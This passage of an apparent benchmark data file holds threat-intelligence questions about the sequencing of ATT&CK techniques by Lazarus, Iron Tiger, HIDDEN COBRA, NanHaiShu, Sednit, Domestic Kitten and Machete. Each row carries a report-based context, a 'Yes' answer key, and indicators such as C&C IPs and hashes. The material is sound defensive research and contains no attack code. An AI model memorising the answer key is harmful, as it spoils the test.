Others: Additional watering-hole attacks were observed on the Comisi\u00f3n Nacional Bancaria y de Valores (Mexico) and a state-owned bank in Uruguay. The eye-watch[.]in domain was used in these attacks and has been associated with other malicious activities, including the delivery of malware variants and a Silverlight exploit based on CVE-2016-0034. A list of 255 IP address strings was found in the exploit kit website code, likely used to filter traffic and deliver exploits only to specific subnets, primarily targeting financial institutions in Poland and Mexico.",Yes,lazarus-watering-hole-attacks.html
2588,54,54-Discovery-T1049-System Network Connections Discovery,"After the malware achieves execution by accepting command line arguments to drop/install DLLs with an RC4 password, is it likely that it will perform system network connections discovery by executing commands and sending the results back to the C&C servers before using a User-Agent resembling a Firefox browser on Windows for Command and Control communication?","Discovery: The malware executes a series of commands to gather system information, including hostname, user information, system version, network configuration, active TCP connections, and more. The results are sent back to the C&C, eye-watch[.]in.","Initial Access: On 3rd February 2017, researchers at badcyber.com reported a series of attacks targeting Polish financial institutions, suspected to originate from the Polish Financial Supervision Authority's website (knf.gov[.]pl). The website code had been altered from at least 2016-10-07 to late January to download malicious JavaScript files from compromised domains sap.misapor[.]ch and eye-watch[.]in, leading to malware downloads on visitors' devices.
Execution: The malware, identified by the MD5 hash 85d316590edfb4212049c4490db08c4b and named gpsvc.exe, is a Win32 executable first seen on 2017-01-26. It is packed with 'Enigma Protector' and drops a known Lazarus group malware variant. The executable accepts command line arguments to list service names, open or set events, and drop/install DLLs under specified service names using an RC4 password derived from the provided password's MD5 hash.
Defense Evasion: The malware uses a commercial packer known as 'Enigma Protector' for defense evasion. Additionally, the malware executes a series of basic system information gathering commands and returns the results via the C&C, eye-watch[.]in, which may also serve as a defense evasion technique by mimicking normal system queries.
Command and Control: The C&C servers for the malware are identified by the IP addresses 125.214.195.17 and 196.29.166.218. The malware communicates with the C&C using a beacon with the User-Agent resembling a Firefox browser on Windows.
Others: Additional watering-hole attacks were observed on the Comisi\u00f3n Nacional Bancaria y de Valores (Mexico) and a state-owned bank in Uruguay. The eye-watch[.]in domain was used in these attacks and has been associated with other malicious activities, including the delivery of malware variants and a Silverlight exploit based on CVE-2016-0034. A list of 255 IP address strings was found in the exploit kit website code, likely used to filter traffic and deliver exploits only to specific subnets, primarily targeting financial institutions in Poland and Mexico.",Yes,lazarus-watering-hole-attacks.html
2590,55,55-Command and Control-T1573-Encrypted Channel,"After persistence is achieved via creating a new service or registry key, is it likely that the Iron Tiger malware will encrypt network traffic using Rivest Cipher 4 (RC4) to facilitate command-and-control communication?","Command and Control: The network traffic between the victim and the attacker was encrypted using Rivest Cipher 4 (RC4), with a unique key for each request, encrypted using 'XOR' and 'AND' instructions. The key was stored in the first 28 bytes of the request. A Python script was written to decrypt network captures (PCAP). Command and Control (C&C) IPs identified were 23.227.207.137 and 89.249.65.194.","Initial Access: During a forensic investigation in March 2018, files linked to Iron Tiger were retrieved, including a malicious executable that dropped a batch file (install.bat) and a cabinet file (data.cab) in a new folder in C:\ProgramData with a random name. The cabinet file contained partially encrypted malicious shellcode and a DLL to execute it. Persistence was achieved via a new service or registry key, depending on malware privileges.
Execution: The malicious executable executed the batch file, decompressing and executing the DLL file. The shellcode decrypted the rest of the encrypted data using a single byte key in an XOR loop, revealing a string indicating a C&C IP address and port. The shellcode's main goal was to load and execute attacker plugins in memory.
Persistence: Persistence was achieved by creating a new service or a new registry key, depending on the privileges that the malware has. The registry key for persistence was 'rundll32.exe_malicious_DLL_path' in 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run'.
Others: The investigation uncovered tools such as password dumpers, Monero cryptocurrency miners, PE injectors, and a modified version of Gh0st RAT. The modified Gh0st RAT, named 'Noodles', appeared to be an old version based on its compilation date and features. Another file, 'Mozilla', was the primary tool used in the attack. Both tools could listen on given ports, but only 'Mozilla' could connect to a bind port. The tools supported SSL and TCP, with a protocol named 'WINNET' not yet supported, suggesting ongoing development. The 'Mozilla' tool relied heavily on plugins, allowing the attacker to load new plugins to the infected machine. A Program database (PDB) path was found inside the binary of the 'Mozilla' tool. Malicious files were found in directories C:\ProgramData\HIDMgr, C:\ProgramData\Rascon, and C:\ProgramData\TrkSvr, with service names HIDMgr, RasconMan, and TrkSvr. File names and hashes were provided for various malicious executables and DLLs.",Yes,nccgroup.trust-Decoding network data from a Gh0st RAT variant
2596,56,56-Exfiltration-T1048-Exfiltration Over Alternative Protocol,"After intercepting customer transaction data through malicious scripts injected into store checkout pages, is HIDDEN COBRA likely to utilize legitimate sites hijacked and repurposed as part of their global exfiltration network to host exfiltration nodes located at entities such as an Italian modeling agency, a vintage music store from Tehran, and a family-run bookstore from New Jersey?","Exfiltration: HIDDEN COBRA developed a global exfiltration network that utilizes legitimate sites hijacked and repurposed to disguise criminal activity. The network funnels stolen assets to be sold on dark web markets. Identified exfiltration nodes include an Italian modeling agency, a vintage music store from Tehran, and a family-run bookstore from New Jersey.","Initial Access: North Korean state-sponsored hackers, associated with the APT Lazarus/HIDDEN COBRA group, have been implicated in breaking into online stores of large US retailers and planting payment skimmers as early as May 2019. The method of access is currently unknown, but attackers often use spearphishing attacks to obtain retail staff passwords.
Command and Control: HIDDEN COBRA injects malicious scripts into the store checkout pages to intercept transactions. The skimmer waits for customer keystrokes and, upon transaction completion, sends the intercepted data, such as credit card numbers, to a HIDDEN COBRA-controlled collection server.
Others: Sansec's research has linked the skimming activity to HIDDEN COBRA due to reused infrastructure from previous operations and distinctive patterns in the malware code. Sansec monitors millions of online stores for skimming activity and typically finds 30 to 100 infected stores per day. The skimming operations have been ongoing since at least May 2019, with multiple independent links to previously documented North Korean hacking operations.",Yes,North Korean hackers are skimming US and European shoppers – Sansec
2601,57,57-Command and Control-T1568-Dynamic Resolution,"After NanHaiShu gathers system information from the infected machine and uploads it to the C&C server, is it likely that the malware will communicate with C&C servers using dynamic DNS providers to upload encoded system information and switch from IP addresses hosted in the United States to a Chinese IP address?","Command and Control: NanHaiShu communicates with C&C servers using dynamic DNS providers. The malware uses HTTP POST to upload encoded system information and HTTP GET to download and execute JScript and VBScript code. The C&C servers initially resolved to IP addresses hosted in the United States but switched to a Chinese IP address on October 26th, 2015.","Initial Access: The threat actor behind NanHaiShu malware used spearphishing email messages as the infection vector to deliver the malware to targeted entities, including the Department of Justice of the Philippines, the organizers of the Asia-Pacific Economic Cooperation (APEC) Summit, and a major international law firm. The emails contained industry-specific terms and were crafted to appear legitimate to the recipients. The attached files, usually XLS or DOC, contained a VBA macro that executed an embedded JScript file. The attack relied on the targets having modified the default security setting in Microsoft Office to allow macro execution.
Execution: Upon enabling the malicious macro, NanHaiShu's VBA macro decodes and runs, writing JScript data to '%appdata%\Microsoft\Network\network.js' and executing it. The macro also decodes a decoy XLS file, saves it using the same filename as the malicious XLS, and loads the decoy. A VBScript file is created to delete the original file. The network.js file modifies the '%regrun%' registry to point to itself as its autostart mechanism.
Persistence: NanHaiShu establishes persistence by modifying the '%regrun%' registry entry to point to the network.js file, ensuring it starts automatically.
Defense Evasion: The malware uses base64 encoding to embed the decoy XLS and JScript file. For the recent sample, the URL string used inside the JScript code was obfuscated in two layers; it had to be decoded using base64, then decrypted using a routine that extracts and converts a Unicode number to a character.
Discovery: NanHaiShu gathers system information from the infected machine, including Volume Serial Number, IP Address, Computer Name, User Name, Operating System, and Proxy Server, and uploads it to the C&C server.
Exfiltration: The malware is capable of receiving and executing additional JScript and VBScript code, which can be used for exfiltration of data. The downloaded files or scripts may then be used to exfiltrate data that is likely to be highly sensitive, given the profile of its targets.
Others: The threat actor behind NanHaiShu is believed to be of Chinese origin, targeting entities involved in the South China Sea dispute. The malware's VBA base64 decoder function is associated with Chinese programmers, and the C&C servers pointed to a Chinese AS coinciding with news reports of US ship movements in the South China Sea. The malware is a Remote Access Trojan (RAT) capable of sending system information to a remote C&C server and executing additional code for potential data exfiltration.",Yes,nanhaishu_whitepaper
2605,57,57-Discovery-T1082-System Information Discovery,"After establishing persistence by modifying the '%regrun%' registry entry to point to the network.js file, is NanHaiShu likely to gather system information from the infected machine, including Volume Serial Number and IP Address, before uploading the collected system information to the C&C server?","Discovery: NanHaiShu gathers system information from the infected machine, including Volume Serial Number, IP Address, Computer Name, User Name, Operating System, and Proxy Server, and uploads it to the C&C server.","Initial Access: The threat actor behind NanHaiShu malware used spearphishing email messages as the infection vector to deliver the malware to targeted entities, including the Department of Justice of the Philippines, the organizers of the Asia-Pacific Economic Cooperation (APEC) Summit, and a major international law firm. The emails contained industry-specific terms and were crafted to appear legitimate to the recipients. The attached files, usually XLS or DOC, contained a VBA macro that executed an embedded JScript file. The attack relied on the targets having modified the default security setting in Microsoft Office to allow macro execution.
Execution: Upon enabling the malicious macro, NanHaiShu's VBA macro decodes and runs, writing JScript data to '%appdata%\Microsoft\Network\network.js' and executing it. The macro also decodes a decoy XLS file, saves it using the same filename as the malicious XLS, and loads the decoy. A VBScript file is created to delete the original file. The network.js file modifies the '%regrun%' registry to point to itself as its autostart mechanism.
Persistence: NanHaiShu establishes persistence by modifying the '%regrun%' registry entry to point to the network.js file, ensuring it starts automatically.
Defense Evasion: The malware uses base64 encoding to embed the decoy XLS and JScript file. For the recent sample, the URL string used inside the JScript code was obfuscated in two layers; it had to be decoded using base64, then decrypted using a routine that extracts and converts a Unicode number to a character.
Command and Control: NanHaiShu communicates with C&C servers using dynamic DNS providers. The malware uses HTTP POST to upload encoded system information and HTTP GET to download and execute JScript and VBScript code. The C&C servers initially resolved to IP addresses hosted in the United States but switched to a Chinese IP address on October 26th, 2015.
Exfiltration: The malware is capable of receiving and executing additional JScript and VBScript code, which can be used for exfiltration of data. The downloaded files or scripts may then be used to exfiltrate data that is likely to be highly sensitive, given the profile of its targets.
Others: The threat actor behind NanHaiShu is believed to be of Chinese origin, targeting entities involved in the South China Sea dispute. The malware's VBA base64 decoder function is associated with Chinese programmers, and the C&C servers pointed to a Chinese AS coinciding with news reports of US ship movements in the South China Sea. The malware is a Remote Access Trojan (RAT) capable of sending system information to a remote C&C server and executing additional code for potential data exfiltration.",Yes,nanhaishu_whitepaper
2606,57,57-Exfiltration-T1041-Exfiltration Over C2 Channel,"After NanHaiShu gathers system information from compromised machines, including Volume Serial Number, IP Address, and User Name, and uploads it to the C&C server via HTTP POST, is it likely that the malware will receive and execute additional JScript and VBScript code for exfiltrating highly sensitive data?","Exfiltration: The malware is capable of receiving and executing additional JScript and VBScript code, which can be used for exfiltration of data. The downloaded files or scripts may then be used to exfiltrate data that is likely to be highly sensitive, given the profile of its targets.","Initial Access: The threat actor behind NanHaiShu malware used spearphishing email messages as the infection vector to deliver the malware to targeted entities, including the Department of Justice of the Philippines, the organizers of the Asia-Pacific Economic Cooperation (APEC) Summit, and a major international law firm. The emails contained industry-specific terms and were crafted to appear legitimate to the recipients. The attached files, usually XLS or DOC, contained a VBA macro that executed an embedded JScript file. The attack relied on the targets having modified the default security setting in Microsoft Office to allow macro execution.
Execution: Upon enabling the malicious macro, NanHaiShu's VBA macro decodes and runs, writing JScript data to '%appdata%\Microsoft\Network\network.js' and executing it. The macro also decodes a decoy XLS file, saves it using the same filename as the malicious XLS, and loads the decoy. A VBScript file is created to delete the original file. The network.js file modifies the '%regrun%' registry to point to itself as its autostart mechanism.
Persistence: NanHaiShu establishes persistence by modifying the '%regrun%' registry entry to point to the network.js file, ensuring it starts automatically.
Defense Evasion: The malware uses base64 encoding to embed the decoy XLS and JScript file. For the recent sample, the URL string used inside the JScript code was obfuscated in two layers; it had to be decoded using base64, then decrypted using a routine that extracts and converts a Unicode number to a character.
Discovery: NanHaiShu gathers system information from the infected machine, including Volume Serial Number, IP Address, Computer Name, User Name, Operating System, and Proxy Server, and uploads it to the C&C server.
Command and Control: NanHaiShu communicates with C&C servers using dynamic DNS providers. The malware uses HTTP POST to upload encoded system information and HTTP GET to download and execute JScript and VBScript code. The C&C servers initially resolved to IP addresses hosted in the United States but switched to a Chinese IP address on October 26th, 2015.
Others: The threat actor behind NanHaiShu is believed to be of Chinese origin, targeting entities involved in the South China Sea dispute. The malware's VBA base64 decoder function is associated with Chinese programmers, and the C&C servers pointed to a Chinese AS coinciding with news reports of US ship movements in the South China Sea. The malware is a Remote Access Trojan (RAT) capable of sending system information to a remote C&C server and executing additional code for potential data exfiltration.",Yes,nanhaishu_whitepaper
2608,58,58-Persistence-T1053-Scheduled Task/Job,"After successfully exploiting the victim's browser using the CVE-2015-5119 Flash exploit to deliver a first-stage backdoor malware, is the Sednit group likely to leverage the Windows privilege escalation exploit within the malware to gain higher privileges before using a scheduled task to establish persistence?","Persistence: If the Flash exploitation is successful, the victim's system receives a first-stage backdoor malware, which ensures the target is as intended. This malware includes the Hacking Team's Windows privilege escalation exploit. The Sednit group appears to have recompiled the source code of the exploit without altering its logic. Once the privilege escalation exploit is effective, the malware establishes persistence on the machine through a scheduled task that runs with the highest privileges.","Initial Access: The Sednit espionage group, also known as APT28 or Fancy Bear, has been actively using a Flash exploit, identified as CVE-2015-5119, to target Eastern European institutions. This exploit was part of the Hacking Team data leak and allows attackers to execute arbitrary code remotely. The Sednit group's attack begins with a spear-phishing email containing a URL that mimics a legitimate domain, such as ""osce-press.org"". Upon visiting the URL, the victim's browser is directed to a landing page that collects detailed information about the computer. If the system meets the criteria set by the Sednit operators, the Flash exploit named ""flash_video_x86.swf"" is delivered. The exploit's decompiled code closely resembles the Hacking Team's version, with the main difference being the way the shellcode is received.
Privilege Escalation: The Sednit group's malware utilizes an unpatched Windows local privilege escalation exploit, which was also part of the Hacking Team leak. This exploit allows the malware to execute with maximum privileges and is used to set persistence on the victim's machine through a scheduled task.
Others: The Hacking Team data leak, which occurred over the weekend prior to July 10, 2015, involved more than 400GB of internal data, including business proposals and source code of the software sold by the company. The leaked data provided a complete exploitation chain for cyber attacks. ESET Research has urged users to upgrade their Flash software to mitigate the risks associated with these exploits. Indicators of Compromise (IoCs) have been identified, including the exploit kit domain name ""osce-press.org"", the Sednit Flash exploit with SHA1 hash D43FD6579AB8B9C40524CC8E4B7BD05BE6674F6C, the Sednit first-stage backdoor with SHA1 hash 51B0E3CD6360D50424BF776B3CD673DD45FD0F97, and the payload persistence script and file names ""fvecer.bat"" and ""api-ms-win-downlevel-profile-l1-1-0.dll"" with SHA1 hash B8B3F53CA2CD64BD101CB59C6553F6289A72D9BB.",Yes,Sednit APT Group Meets Hacking Team
2612,59,59-Command and Control-T1071-Application Layer Protocol,"After leveraging mobile applications loaded with spyware to collect sensitive information such as contact lists and geo-location from victims during the Collection phase, is it likely the attackers' infrastructure will receive the stolen data from the compromised devices over an application layer protocol during the Command and Control phase?","Command and Control: The attackers' infrastructure includes C&C servers that receive stolen data from the compromised devices. One of the applications contacts a domain, firmwaresystemupdate[.]com, which initially resolved to an Iranian IP address before switching to a Russian one. Other applications contact IP addresses directly, which are newly registered domains following a first name-surname naming convention, such as Stevenwentz[.]com, Ronaldlubbers[.]site, and Georgethompson[.]space. Each victim is assigned a unique device UUID, which is used to identify the logs sent back to the attackers.","Initial Access: Recent investigations by Check Point researchers have uncovered an extensive and targeted surveillance operation, dubbed 'Domestic Kitten,' which has been active since 2016. The attackers entice victims to download mobile applications loaded with spyware by using fake decoy content. These applications include an ISIS branded wallpaper changer, updates from the ANF Kurdistan news agency, and a fake version of the messaging app Vidogram. The applications are designed to appeal to Kurdish and Turkish natives, ISIS supporters, and Iranian citizens. The attackers use these applications to collect sensitive information from the victims' mobile devices.
Collection: The malware embedded in the mobile applications collects a wide range of data from the victims' devices. This includes contact lists, phone call records, SMS messages, browser history and bookmarks, geo-location, photos, and surrounding voice recordings. The stolen data is sent back to the attackers' command and control (C&C) servers using HTTP POST requests.
Others: The operation 'Domestic Kitten' has affected around 240 users, with over 97% of the victims being Iranian citizens. The campaign also targets individuals from Afghanistan, Iraq, and Great Britain. The attackers meticulously document the campaign, including the name of the malicious application used and an Application Code Name field for quick recognition. The number of people affected is much higher than the number of direct victims, as the attackers also harvest the full contact list from each victim's mobile device, and record phone calls and SMS details, compromising the private information of thousands of unrelated users. Check Point's Mobile solutions, such as Sand Blast Mobile and Zone Alarm Mobile, can protect against such attacks. Indicators of Compromise include several hashes and IP addresses associated with the campaign.",Yes,Domestic Kitten An Iranian Surveillance Operation
2618,6,6-Defense Evasion-T1036-Masquerading,"After Machete uses a downloader to install and execute its backdoor components by decrypting and running the malware, is it likely to create Windows Task Scheduler tasks for persistence before employing techniques to impersonate legitimate applications like Google Chrome and Dropbox for defense evasion?","Defense Evasion: Machete employed various defense evasion techniques, including obfuscation of Python scripts, software packing using self-extracting files, and masquerading file and task names to impersonate legitimate applications like Google Chrome, Java, Dropbox, Adobe Reader, and Python executables.","Initial Access: The Machete campaign utilized spearphishing as the primary method for initial access. Victims received emails containing either a link to download a compressed file from an external server or a zipped file with malicious contents. These emails were crafted to appear legitimate, often using real documents previously stolen from other victims as decoys. The documents used as decoys, such as classified military documents and Radiogramas, were sent and received legitimately several times a day by targets, making the phishing attempts highly convincing.
Execution: Machete's execution process involved the use of a downloader as the first stage, which installed the backdoor components on the compromised system. The downloader was a self-extracting file that opened a PDF or Microsoft Office file as a decoy and then ran the downloader executable. The actual Machete malware was then downloaded, decrypted, and executed.
Persistence: To maintain persistence, Machete created Windows Task Scheduler tasks to ensure the continued execution of its components. The malware also used hidden files and directories to avoid detection and ensure its components could survive system restarts and user logouts.
Credential Access: Machete targeted credentials by scanning the compromised system for key and certificate file extensions and exfiltrating files with stored credentials for several browsers.
Discovery: The Machete malware conducted discovery activities by listing all nearby Wi-Fi networks using the netsh command, detecting newly inserted devices, producing file listings for exfiltration, and enumerating running processes in search of browsers. It also gathered browser data such as bookmarks and reported window names along with keylogger information.
Collection: Machete collected data by stealing clipboard contents, copying files from local systems and removable media, logging keystrokes, capturing screenshots, and staging data in a temporary folder where files and logs were encrypted.
Command and Control: Machete used standard FTP and HTTP ports for communication with its command and control (C&C) servers. It also implemented fallback channels, using HTTP to exfiltrate documents if FTP was unavailable. The malware could download additional files for execution on the victim's machine and used FTP and HTTP for C&C communication.
Exfiltration: Machete automatically exfiltrated all collected files to remote servers. The data was encrypted with AES before transmission, and in some versions, it was also base64 encoded. Browser profile data was compressed as .zip files prior to exfiltration. Data was exfiltrated over the same channel used for C&C, and scheduled transfers were set up to send data to the C&C server every 10 minutes. Additionally, data from all drives in a compromised system could be copied to a removable drive if a special file was present on that drive.",Yes,ESET_Machete
2619,6,6-Defense Evasion-T1027-Obfuscated Files or Information,"After using spearphishing emails containing decoy military documents to achieve initial access to the target systems, is Machete likely to obfuscate Python scripts for defense evasion before creating hidden files and directories to maintain persistence on the compromised systems?","Defense Evasion: Machete employed various defense evasion techniques, including obfuscation of Python scripts, software packing using self-extracting files, and masquerading file and task names to impersonate legitimate applications like Google Chrome, Java, Dropbox, Adobe Reader, and Python executables.","Initial Access: The Machete campaign utilized spearphishing as the primary method for initial access. Victims received emails containing either a link to download a compressed file from an external server or a zipped file with malicious contents. These emails were crafted to appear legitimate, often using real documents previously stolen from other victims as decoys. The documents used as decoys, such as classified military documents and Radiogramas, were sent and received legitimately several times a day by targets, making the phishing attempts highly convincing.
Execution: Machete's execution process involved the use of a downloader as the first stage, which installed the backdoor components on the compromised system. The downloader was a self-extracting file that opened a PDF or Microsoft Office file as a decoy and then ran the downloader executable. The actual Machete malware was then downloaded, decrypted, and executed.
Persistence: To maintain persistence, Machete created Windows Task Scheduler tasks to ensure the continued execution of its components. The malware also used hidden files and directories to avoid detection and ensure its components could survive system restarts and user logouts.
Credential Access: Machete targeted credentials by scanning the compromised system for key and certificate file extensions and exfiltrating files with stored credentials for several browsers.
Discovery: The Machete malware conducted discovery activities by listing all nearby Wi-Fi networks using the netsh command, detecting newly inserted devices, producing file listings for exfiltration, and enumerating running processes in search of browsers. It also gathered browser data such as bookmarks and reported window names along with keylogger information.
Collection: Machete collected data by stealing clipboard contents, copying files from local systems and removable media, logging keystrokes, capturing screenshots, and staging data in a temporary folder where files and logs were encrypted.
Command and Control: Machete used standard FTP and HTTP ports for communication with its command and control (C&C) servers. It also implemented fallback channels, using HTTP to exfiltrate documents if FTP was unavailable. The malware could download additional files for execution on the victim's machine and used FTP and HTTP for C&C communication.
Exfiltration: Machete automatically exfiltrated all collected files to remote servers. The data was encrypted with AES before transmission, and in some versions, it was also base64 encoded. Browser profile data was compressed as .zip files prior to exfiltration. Data was exfiltrated over the same channel used for C&C, and scheduled transfers were set up to send data to the C&C server every 10 minutes. Additionally, data from all drives in a compromised system could be copied to a removable drive if a special file was present on that drive.",Yes,ESET_Machete
2621,6,6-Command and Control-T1008-Fallback Channels,"After Machete collects data by stealing clipboard contents, copying files from local systems and removable media, and staging them in a temporary folder, is it likely that the malware will use standard FTP and HTTP ports for communication with its command and control servers before implementing fallback channels for network traffic?","Command and Control: Machete used standard FTP and HTTP ports for communication with its command and control (C&C) servers. It also implemented fallback channels, using HTTP to exfiltrate documents if FTP was unavailable. The malware could download additional files for execution on the victim's machine and used FTP and HTTP for C&C communication.","Initial Access: The Machete campaign utilized spearphishing as the primary method for initial access. Victims received emails containing either a link to download a compressed file from an external server or a zipped file with malicious contents. These emails were crafted to appear legitimate, often using real documents previously stolen from other victims as decoys. The documents used as decoys, such as classified military documents and Radiogramas, were sent and received legitimately several times a day by targets, making the phishing attempts highly convincing.
Execution: Machete's execution process involved the use of a downloader as the first stage, which installed the backdoor components on the compromised system. The downloader was a self-extracting file that opened a PDF or Microsoft Office file as a decoy and then ran the downloader executable. The actual Machete malware was then downloaded, decrypted, and executed.
Persistence: To maintain persistence, Machete created Windows Task Scheduler tasks to ensure the continued execution of its components. The malware also used hidden files and directories to avoid detection and ensure its components could survive system restarts and user logouts.
Defense Evasion: Machete employed various defense evasion techniques, including obfuscation of Python scripts, software packing using self-extracting files, and masquerading file and task names to impersonate legitimate applications like Google Chrome, Java, Dropbox, Adobe Reader, and Python executables.
Credential Access: Machete targeted credentials by scanning the compromised system for key and certificate file extensions and exfiltrating files with stored credentials for several browsers.
Discovery: The Machete malware conducted discovery activities by listing all nearby Wi-Fi networks using the netsh command, detecting newly inserted devices, producing file listings for exfiltration, and enumerating running processes in search of browsers. It also gathered browser data such as bookmarks and reported window names along with keylogger information.
Collection: Machete collected data by stealing clipboard contents, copying files from local systems and removable media, logging keystrokes, capturing screenshots, and staging data in a temporary folder where files and logs were encrypted.
Exfiltration: Machete automatically exfiltrated all collected files to remote servers. The data was encrypted with AES before transmission, and in some versions, it was also base64 encoded. Browser profile data was compressed as .zip files prior to exfiltration. Data was exfiltrated over the same channel used for C&C, and scheduled transfers were set up to send data to the C&C server every 10 minutes. Additionally, data from all drives in a compromised system could be copied to a removable drive if a special file was present on that drive.",Yes,ESET_Machete
2623,6,6-Persistence-T1053-Scheduled Task/Job,Is it likely that Machete will execute a downloader that opens a decoy PDF or Microsoft Office document and installs backdoor components prior to creating Windows Task Scheduler tasks for maintaining persistence?,"Persistence: To maintain persistence, Machete created Windows Task Scheduler tasks to ensure the continued execution of its components. The malware also used hidden files and directories to avoid detection and ensure its components could survive system restarts and user logouts.","Initial Access: The Machete campaign utilized spearphishing as the primary method for initial access. Victims received emails containing either a link to download a compressed file from an external server or a zipped file with malicious contents. These emails were crafted to appear legitimate, often using real documents previously stolen from other victims as decoys. The documents used as decoys, such as classified military documents and Radiogramas, were sent and received legitimately several times a day by targets, making the phishing attempts highly convincing.
Execution: Machete's execution process involved the use of a downloader as the first stage, which installed the backdoor components on the compromised system. The downloader was a self-extracting file that opened a PDF or Microsoft Office file as a decoy and then ran the downloader executable. The actual Machete malware was then downloaded, decrypted, and executed.
Defense Evasion: Machete employed various defense evasion techniques, including obfuscation of Python scripts, software packing using self-extracting files, and masquerading file and task names to impersonate legitimate applications like Google Chrome, Java, Dropbox, Adobe Reader, and Python executables.
Credential Access: Machete targeted credentials by scanning the compromised system for key and certificate file extensions and exfiltrating files with stored credentials for several browsers.
Discovery: The Machete malware conducted discovery activities by listing all nearby Wi-Fi networks using the netsh command, detecting newly inserted devices, producing file listings for exfiltration, and enumerating running processes in search of browsers. It also gathered browser data such as bookmarks and reported window names along with keylogger information.
Collection: Machete collected data by stealing clipboard contents, copying files from local systems and removable media, logging keystrokes, capturing screenshots, and staging data in a temporary folder where files and logs were encrypted.
Command and Control: Machete used standard FTP and HTTP ports for communication with its command and control (C&C) servers. It also implemented fallback channels, using HTTP to exfiltrate documents if FTP was unavailable. The malware could download additional files for execution on the victim's machine and used FTP and HTTP for C&C communication.
Exfiltration: Machete automatically exfiltrated all collected files to remote servers. The data was encrypted with AES before transmission, and in some versions, it was also base64 encoded. Browser profile data was compressed as .zip files prior to exfiltration. Data was exfiltrated over the same channel used for C&C, and scheduled transfers were set up to send data to the C&C server every 10 minutes. Additionally, data from all drives in a compromised system could be copied to a removable drive if a special file was present on that drive.",Yes,ESET_Machete
2624,6,6-Discovery-T1016-System Network Configuration Discovery,"After using spearphishing to establish initial access and subsequently deploying the downloader for execution, is Machete likely to utilize the `netsh` command to list all nearby Wi-Fi networks before collecting clipboard contents, logging keystrokes, and staging data in a temporary folder?","Discovery: The Machete malware conducted discovery activities by listing all nearby Wi-Fi networks using the netsh command, detecting newly inserted devices, producing file listings for exfiltration, and enumerating running processes in search of browsers. It also gathered browser data such as bookmarks and reported window names along with keylogger information.","Initial Access: The Machete campaign utilized spearphishing as the primary method for initial access. Victims received emails containing either a link to download a compressed file from an external server or a zipped file with malicious contents. These emails were crafted to appear legitimate, often using real documents previously stolen from other victims as decoys. The documents used as decoys, such as classified military documents and Radiogramas, were sent and received legitimately several times a day by targets, making the phishing attempts highly convincing.
Execution: Machete's execution process involved the use of a downloader as the first stage, which installed the backdoor components on the compromised system. The downloader was a self-extracting file that opened a PDF or Microsoft Office file as a decoy and then ran the downloader executable. The actual Machete malware was then downloaded, decrypted, and executed.
Persistence: To maintain persistence, Machete created Windows Task Scheduler tasks to ensure the continued execution of its components. The malware also used hidden files and directories to avoid detection and ensure its components could survive system restarts and user logouts.
Defense Evasion: Machete employed various defense evasion techniques, including obfuscation of Python scripts, software packing using self-extracting files, and masquerading file and task names to impersonate legitimate applications like Google Chrome, Java, Dropbox, Adobe Reader, and Python executables.
Credential Access: Machete targeted credentials by scanning the compromised system for key and certificate file extensions and exfiltrating files with stored credentials for several browsers.
Collection: Machete collected data by stealing clipboard contents, copying files from local systems and removable media, logging keystrokes, capturing screenshots, and staging data in a temporary folder where files and logs were encrypted.
Command and Control: Machete used standard FTP and HTTP ports for communication with its command and control (C&C) servers. It also implemented fallback channels, using HTTP to exfiltrate documents if FTP was unavailable. The malware could download additional files for execution on the victim's machine and used FTP and HTTP for C&C communication.
Exfiltration: Machete automatically exfiltrated all collected files to remote servers. The data was encrypted with AES before transmission, and in some versions, it was also base64 encoded. Browser profile data was compressed as .zip files prior to exfiltration. Data was exfiltrated over the same channel used for C&C, and scheduled transfers were set up to send data to the C&C server every 10 minutes. Additionally, data from all drives in a compromised system could be copied to a removable drive if a special file was present on that drive.",Yes,ESET_Machete
2625,6,6-Discovery-T1217-Browser Information Discovery,"After Machete creates Windows Task Scheduler tasks for persistence, is it likely that the malware will use the netsh command to list nearby Wi-Fi networks before gathering browser data such as bookmarks, window names, and other artifacts for discovery?","Discovery: The Machete malware conducted discovery activities by listing all nearby Wi-Fi networks using the netsh command, detecting newly inserted devices, producing file listings for exfiltration, and enumerating running processes in search of browsers. It also gathered browser data such as bookmarks and reported window names along with keylogger information.","Initial Access: The Machete campaign utilized spearphishing as the primary method for initial access. Victims received emails containing either a link to download a compressed file from an external server or a zipped file with malicious contents. These emails were crafted to appear legitimate, often using real documents previously stolen from other victims as decoys. The documents used as decoys, such as classified military documents and Radiogramas, were sent and received legitimately several times a day by targets, making the phishing attempts highly convincing.
Execution: Machete's execution process involved the use of a downloader as the first stage, which installed the backdoor components on the compromised system. The downloader was a self-extracting file that opened a PDF or Microsoft Office file as a decoy and then ran the downloader executable. The actual Machete malware was then downloaded, decrypted, and executed.
Persistence: To maintain persistence, Machete created Windows Task Scheduler tasks to ensure the continued execution of its components. The malware also used hidden files and directories to avoid detection and ensure its components could survive system restarts and user logouts.
Defense Evasion: Machete employed various defense evasion techniques, including obfuscation of Python scripts, software packing using self-extracting files, and masquerading file and task names to impersonate legitimate applications like Google Chrome, Java, Dropbox, Adobe Reader, and Python executables.
Credential Access: Machete targeted credentials by scanning the compromised system for key and certificate file extensions and exfiltrating files with stored credentials for several browsers.
Collection: Machete collected data by stealing clipboard contents, copying files from local systems and removable media, logging keystrokes, capturing screenshots, and staging data in a temporary folder where files and logs were encrypted.
Command and Control: Machete used standard FTP and HTTP ports for communication with its command and control (C&C) servers. It also implemented fallback channels, using HTTP to exfiltrate documents if FTP was unavailable. The malware could download additional files for execution on the victim's machine and used FTP and HTTP for C&C communication.
Exfiltration: Machete automatically exfiltrated all collected files to remote servers. The data was encrypted with AES before transmission, and in some versions, it was also base64 encoded. Browser profile data was compressed as .zip files prior to exfiltration. Data was exfiltrated over the same channel used for C&C, and scheduled transfers were set up to send data to the C&C server every 10 minutes. Additionally, data from all drives in a compromised system could be copied to a removable drive if a special file was present on that drive.",Yes,ESET_Machete
